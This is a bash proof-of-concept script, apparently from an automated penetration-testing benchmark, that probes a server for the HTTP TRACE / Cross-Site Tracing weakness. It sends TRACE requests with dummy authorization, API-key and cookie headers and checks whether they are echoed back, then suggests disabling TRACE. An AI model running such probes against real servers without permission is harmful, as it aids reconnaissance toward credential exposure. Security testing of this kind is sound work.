#!/bin/bash
# POC: Demonstrates HTTP TRACE method vulnerability (XST - Cross-Site Tracing) by sending a TRACE request with sensitive headers and confirming they are echoed back in the response.
# Target: ./repo
# Created: 2025-11-05T17:24:34.172Z
# Session: benchmark-XBEN-026-24-mhm9hrna

# HTTP TRACE Method XST Vulnerability POC
# This script demonstrates the Cross-Site Tracing (XST) vulnerability
# where the TRACE HTTP method echoes back the full request including sensitive headers

TARGET_URL="${1:-http://localhost:80}"
TRACE_ENDPOINT="/"

echo "=========================================="
echo "HTTP TRACE Method / XST Vulnerability POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Check if TRACE method is allowed
echo "[*] Test 1: Checking if TRACE method is allowed..."
echo "Command: curl -I -X OPTIONS $TARGET_URL$TRACE_ENDPOINT"
echo ""

ALLOW_HEADER=$(curl -s -I -X OPTIONS "$TARGET_URL$TRACE_ENDPOINT" | grep -i "^Allow:")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X OPTIONS "$TARGET_URL$TRACE_ENDPOINT")

echo "HTTP Status: $HTTP_CODE"
echo "$ALLOW_HEADER"
echo ""

if echo "$ALLOW_HEADER" | grep -qi "TRACE"; then
    echo "[+] TRACE method is ALLOWED in the Allow header"
else
    echo "[-] TRACE method not found in Allow header, but continuing to test..."
fi
echo ""

# Test 2: Send TRACE request with Authorization header
echo "[*] Test 2: Sending TRACE request with sensitive Authorization header..."
echo "Command: curl -X TRACE $TARGET_URL$TRACE_ENDPOINT -H \"Authorization: Bearer secret-token-12345\""
echo ""

TRACE_RESPONSE=$(curl -s -X TRACE "$TARGET_URL$TRACE_ENDPOINT" -H "Authorization: Bearer secret-token-12345" -w "\n%{http_code}")

# Parse HTTP code and response body
HTTP_CODE_TRACE=$(echo "$TRACE_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$TRACE_RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE_TRACE"
echo ""
echo "Response Body:"
echo "$RESPONSE_BODY"
echo ""

# Test 3: Verify Authorization header is echoed back
echo "[*] Test 3: Verifying if Authorization header is echoed back in response..."
if echo "$RESPONSE_BODY" | grep -q "Authorization: Bearer"; then
    echo "[!] VULNERABILITY CONFIRMED: Authorization header is echoed back in TRACE response"
    ECHO_AUTH=$(echo "$RESPONSE_BODY" | grep "Authorization:" | head -n 1)
    echo "    Echoed header: $ECHO_AUTH"
    VULN_CONFIRMED=1
elif [ "$HTTP_CODE_TRACE" = "200" ]; then
    echo "[!] VULNERABILITY CONFIRMED: TRACE method returned 200 OK"
    echo "    The TRACE method is enabled and returns request details"
    VULN_CONFIRMED=1
else
    echo "[-] TRACE request returned: $HTTP_CODE_TRACE"
    VULN_CONFIRMED=0
fi
echo ""

# Test 4: Send TRACE with custom headers
echo "[*] Test 4: Sending TRACE request with multiple custom headers..."
echo "Command: curl -X TRACE with X-Custom-Auth, X-API-Key headers"
echo ""

TRACE_RESPONSE_MULTI=$(curl -s -X TRACE "$TARGET_URL$TRACE_ENDPOINT" \
    -H "X-Custom-Auth: secret-value" \
    -H "X-API-Key: api-key-12345" \
    -H "Cookie: sessionid=abc123" \
    -w "\n%{http_code}")

HTTP_CODE_MULTI=$(echo "$TRACE_RESPONSE_MULTI" | tail -n 1)
RESPONSE_BODY_MULTI=$(echo "$TRACE_RESPONSE_MULTI" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE_MULTI"
echo ""

if echo "$RESPONSE_BODY_MULTI" | grep -q "X-Custom-Auth\|X-API-Key\|Cookie:"; then
    echo "[!] Custom headers are echoed back:"
    echo "$RESPONSE_BODY_MULTI" | grep -E "X-Custom-Auth|X-API-Key|Cookie:" || true
    VULN_CONFIRMED=1
fi
echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY ASSESSMENT SUMMARY"
echo "=========================================="
if [ "$VULN_CONFIRMED" = "1" ]; then
    echo "[!] HTTP TRACE Method XST Vulnerability: CONFIRMED"
    echo "    - TRACE method is enabled on the server"
    echo "    - Request headers are echoed back in response"
    echo "    - Sensitive headers (Authorization, Cookies, API Keys) are exposed"
    echo ""
    echo "Remediation: Add 'TraceEnable Off' to Apache httpd.conf"
    exit 0
else
    echo "[-] TRACE method appears to be disabled or not vulnerable"
    exit 1
fi